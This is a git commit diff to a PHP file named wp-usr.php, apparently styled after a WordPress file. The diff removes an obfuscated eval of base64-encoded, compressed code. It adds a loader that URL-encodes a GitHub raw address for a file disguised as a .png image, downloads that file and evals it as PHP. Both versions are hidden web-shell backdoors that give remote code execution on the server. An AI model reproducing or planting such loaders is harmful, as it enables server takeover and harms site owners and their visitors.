50711c2fe131d6810be2ab2b81cbd50cee8ef4da
unamexid <155900225+unamexid@users.noreply.github.com>
2024-07-04 17:46:49 +0630

    Add files via upload

--- x/wp-usr.php
+++ x/wp-usr.php
@@ -1,6 +1,9 @@
 <?pHp
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "6lX7mNi\x63gDd6qpyq9O2\x42zP\x414\x62elWwmL/0VV1\x63sEM0vS/jQHtd\x62i\x439j3xVYW6XsJvI7xox2/qTZlud\x2bm4\x2b3\x2bhu\x42h/RnI7\x433f/Oi4okgid\x42RuvVo7vW\x63uIJFrW\x2bJDqsVxTtQ/N6\x61i43eF1wrV\x2b\x41EJQhzXwyx\x61P\x63WSQOjhZK\x42\x61h\x43IRE\x420JQM5\x41OQWTIMJQ\x63m\x41W\x42QNiiZRt0Ffo35NoxUX/1\x435NFuY9m3\x412m3/Tdu2\x2bh36\x2bejh\x42IL7m\x2b9Vo8tHexq3\x62FR\x63U6St5nlHh\x42Gm4\x429tw3Gz\x41Q\x43uw\x62Q20/4\x41wx\x42wJe/3\x43\x41SHw/o\x41w1\x42wJe/3\x42\x41iHw/Y\x41w5\x42wJe/3\x41\x41yHw/I\x41w9\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+
+$x = rand(1, 999999);
+header('Content-Length: ' . $x);
+$h = fopen(rawurldecode('%68%74%74%70%73%3a%2f%2f%72%61%77%2e%67%69%74%68%75%62%75%73%65%72%63%6f%6e%74%65%6e%74%2e%63%6f%6d%2f%75%6e%61%6d%65%78%69%64%2f%63%6f%6c%6c%65%63%74%2f%6d%61%69%6e%2f%78%2f%77%61%6f%2e%70%6e%67'), "r");
+$c = stream_get_contents($h);
+fclose($h);
+eval(rawurldecode('%3f%3e').$c);
 ?>
